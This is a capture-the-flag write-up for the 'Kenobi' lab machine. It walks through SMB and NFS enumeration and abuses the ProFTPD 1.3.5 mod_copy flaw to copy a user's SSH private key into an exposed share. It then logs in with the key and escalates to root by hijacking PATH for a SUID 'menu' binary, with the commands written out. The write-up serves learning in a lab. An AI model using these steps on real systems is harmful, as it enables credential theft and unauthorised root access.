---
title: Kenobi
tags:
- writeups
---

## Recon

![[write-ups/images/nmap_scan_kenobi.png]]

### Enumerating SMB
Started with `enum4linux` or with `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.83.28`. That revealed an open share with anonymity login enabled which exposed a `log.txt` file. Tried getting it with  `smbget -U "" -R smb://10.10.83.28/anonymous`, but got this back:

```bash
Can't read 64000 bytes at offset 0, file smb://10.10.83.28/anonymous/log.txt
Failed to download /log.txt: Connection timed out
```

A workaround for this is to mount locally & copy the content:

```bash
sudo mkdir /mnt/smbfs && sudo mount -t cifs //10.10.83.28/anonymous /mnt/smbfs -o username=none && cp /mnt/smbfs/log.txt .
```

![[write-ups/images/Pasted image 20220801215010.png]]

### NFS
We see port `111` running the `rpcbind` service. From the [man page](https://www.man7.org/linux/man-pages/man8/rpcbind.8.html), we see that this service just converts remote procedure calls _(RPC)_ into universal addresses. To enumerate it I used nmap: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.83.28`

```bash
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```

### FTP
We also have an FTP port open on `21` which runs ProFTPD 1.3.5. Running `searchsploit ProFTPD 1.3.5` we get

![[write-ups/images/Pasted image 20220801131619.png]]

So we have an [RCE](https://packetstormsecurity.com/files/162777/ProFTPd-1.3.5-Remote-Command-Execution.html) by leveraging the `mod_copy` module, to get the script I ran: `searchsploit -m 36803`. Thus, we can use the `SITE CPFR` & `SITE CPTO` cmds to copy files/dirs from one place to another on the server => any unauthenticated client can leverage them to copy files from any part of the filesystem to a chosen destination

## Getting user
Since we have the open network file system in `/var` & we know that the FTP service is running as the `Kenobi` user *(from `log.txt`)* => we can leak Kenobi's SSH key

![[write-ups/images/Pasted image 20220801131505.png]]

Then just `chmod 700 id_rsa && ssh -i id_rsa kenobi@10.10.83.28`

## Privilage Escalation
- find `SUID`, `SGID` & `Sticky` binaries: `find / -perm -u=s -type f 2>/dev/null`
	- ![[write-ups/images/Pasted image 20220801133918.png]]
- we see the `menu` binary which is quite peculiar, so let's run it
	- ![[write-ups/images/Pasted image 20220801134008.png]]
- it seems that it's just a helper script that let's us check the status of the web server, get the kernel version & run `ifconfig`. Let's do some more digging
	- ![[write-ups/images/Pasted image 20220801134236.png]]
- we see that it uses `curl`, `uname` & `ifconfig`. However, it's not specifying a full path to the binary => we can hijack one of these programs by placing a copy in the `$PATH` before the original one & run whatever we want, so let's try it
	```bash
	echo /bin/bash > ifconfig
	chmod 777 ifconfig
	mkdir bin
	mv ifconfig bin
	```
	- ![[write-ups/images/Pasted image 20220801134826.png]]

## Refs
- [mod_copy module docs](http://www.proftpd.org/docs/contrib/mod_copy.html)
- [HakTricks privesc linux](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path)

## See Also
- [[write-ups/THM]]
